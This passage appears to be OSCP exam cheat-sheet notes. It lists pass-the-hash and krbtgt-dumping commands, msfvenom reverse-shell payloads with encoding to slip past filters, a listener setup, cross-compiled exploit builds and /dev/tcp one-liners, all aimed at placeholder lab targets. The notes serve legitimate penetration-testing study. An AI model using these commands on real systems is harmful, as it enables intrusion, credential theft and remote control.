nxc winrm DC01 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam
impacket-secretsdump -just-dc-user krbtgt 'oscp.exam/tom_admin@DC01'
```

# Toolbox

## Ports worth memorising

| Port | Service | First command |
| --- | --- | --- |
| 21 | FTP | `ftp -an TARGET`, check anonymous |
| 22 | SSH | reuse every credential you find |
| 25/110/143 | mail | `smtp-user-enum`, IMAP login test |
| 53 | DNS | `dig AXFR` |
| 80/443 | HTTP | headers, title, robots, vhosts |
| 88 | Kerberos | `nxc smb`, clock |
| 111/2049 | NFS | `showmount -e` |
| 135/139/445 | SMB/RPC | `nxc smb`, `smbclient -L` |
| 161/udp | SNMP | `snmpwalk -v1 -c public` |
| 389/636 | LDAP | `nxc ldap` |
| 1433 | MSSQL | `impacket-mssqlclient`, `sysadmin` |
| 3389 | RDP | `xfreerdp` |
| 5985/5986 | WinRM | `evil-winrm`, `nxc winrm` |
| 8021 | FreeSWITCH | `auth ClueCon` |
| 8083 | Vesta | token then login |
| 20000 | Usermin/Webmin | version to CVE |

## Wordlists that are already on Kali

```bash
ls /usr/share/wordlists/
ls /usr/share/seclists/Discovery/Web-Content/ | head
ls /usr/share/seclists/Discovery/DNS/ | head
zcat /usr/share/wordlists/rockyou.txt.gz | head
ls /usr/share/hashcat/rules/
```

## Payload generation

- Windows staged and non-staged.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=443 -f exe -o nonstaged.exe
msfvenom -p windows/x64/shell/reverse_tcp LHOST=LHOST LPORT=443 -f exe -o staged.exe
msfvenom -l payloads --platform windows --arch x64
```

- Linux, and the encodings that get past a filter.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=443 -f elf -o lin.elf
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe
```

- The handler, because a staged payload needs one.

```text
use multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST LHOST
set LPORT 443
run
```

## Cross-compiling on Kali

```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

## One-liners worth memorising

- A file, base64, both directions.

```bash
base64 -w0 file > file.b64
base64 -d file.b64 > file
```

- A port, from the target's point of view.

```bash
timeout 5 bash -c 'echo x >/dev/tcp/LHOST/443' && echo open || echo closed
```

- A web server that logs what it receives.

```bash
python3 -m http.server 8888
```

- A quick listener that shows the first bytes.

```bash
nc -lvnp 443 | xxd | head
```

- Loop over a wordlist against one endpoint, with a size filter.

```bash
for u in $(cat paths.txt); do
  printf '%-30s ' "$u"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://TARGET/$u"
done
```

## Troubleshooting: why nothing works

| Symptom | Usually |
| --- | --- |
| Kerberos `KRB_AP_ERR_SKEW` | clock drift — `rdate -n DC01` |
| Kerberos fails on an IP | add `DC01.domain domain` to `/etc/hosts` |
| `evil-winrm` 5985 refused | try `-S -P 5986` |
| `nxc` says `STATUS_LOGON_FAILURE` for a domain user | add `-d DOMAIN`, or `--local-auth` for a local one |
| reverse shell connects then dies | FIFO with no `setsid`/`nohup`, or the port is filtered |
| shell is a pipe, no TTY | `python3 pty.spawn`, or `script -qc /bin/bash /dev/null` |
| `sudo -l` asks for a password | you are not that user; check `id` first |
| `tar` exploit does nothing | the cron uses a glob; verify with `ls -A` and one manual run |
| library fails to load after `ld.so.preload` | CRLF in the path — `cat -A` |
| Windows exploit "succeeds" but no user | verify with `net user` / `net localgroup administrators` |
| hashcat finds nothing | wrong mode, wrong potfile, or the hash is truncated |
| page 200 but empty | SPA catch-all; compare `size_download` |

## A last-minute checklist before you submit

```bash
grep -rE "flag|proof|local\.txt" ~/exam/TARGET/notes.md
ls -la ~/exam/TARGET/evidence/
```

- Every flag has a command that produced it, a timestamp, and a hostname.
- Every finding has the request and the response, not just the conclusion.
- Everything you planted has been removed, or is listed with the reason it was left.
